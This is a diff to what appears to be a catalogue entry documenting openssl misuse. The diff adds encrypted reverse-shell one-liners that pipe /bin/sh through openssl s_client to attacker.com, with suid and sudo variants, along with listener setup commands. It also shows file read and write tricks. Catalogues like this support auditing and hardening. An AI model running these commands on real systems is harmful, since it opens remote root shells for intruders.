@@ -52,11 +52,31 @@ functions:
         LFILE=file_to_read
         openssl enc -in "$LFILE"
   suid:
+    - description: |
+        To receive the shell run the following on the attacker box:
+
+            openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+            openssl s_server -quiet -key key.pem -cert cert.pem -port 12345
+
+        Communication between attacker and target will be encrypted.
+      code: |
+        RHOST=attacker.com
+        RPORT=12345
+        mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -no_ign_eof -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
+
     - code: |
         LFILE=file_to_write
         echo DATA | openssl enc -out "$LFILE"
   sudo:
-    - code: |
-        LFILE=file_to_write
-        echo DATA | sudo openssl enc -out "$LFILE"
+    - description: |
+        To receive the shell run the following on the attacker box:
+
+            openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
+            openssl s_server -quiet -key key.pem -cert cert.pem -port 12345
+
+        Communication between attacker and target will be encrypted.
+      code: |
+        RHOST=attacker.com
+        RPORT=12345
+        mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -no_ign_eof -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s
 ---
